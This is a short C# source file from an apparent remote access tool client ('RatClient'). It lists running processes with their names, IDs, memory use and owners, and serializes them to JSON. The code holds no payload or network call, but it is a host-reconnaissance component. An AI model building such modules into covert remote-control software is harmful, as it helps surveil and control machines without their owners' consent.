using System.Diagnostics;
using System.Linq;
using System.Collections.Generic;


namespace RatClient.ProcManage
{
    class ProcInfo
    {
        public static byte[] GetFormatedProcesses() 
        {
            Process[] processList = Process.GetProcesses();

            var sortedProcesses = processList.OrderBy(p => p.ProcessName).ToArray();
            List<string[]> res = new List<string[]>();
            foreach (Process i in sortedProcesses)
            { 
                List<string> list = new List<string>();
                list.Add(i.ProcessName);
                list.Add(i.Id.ToString());
                list.Add(i.WorkingSet64.ToString());
                list.Add(Tools.GetOwnerByPid((uint)i.Id));
                res.Add(list.ToArray());
            }
            return Tools.SerializeToJson(res.ToArray()); 
        }
    }
}
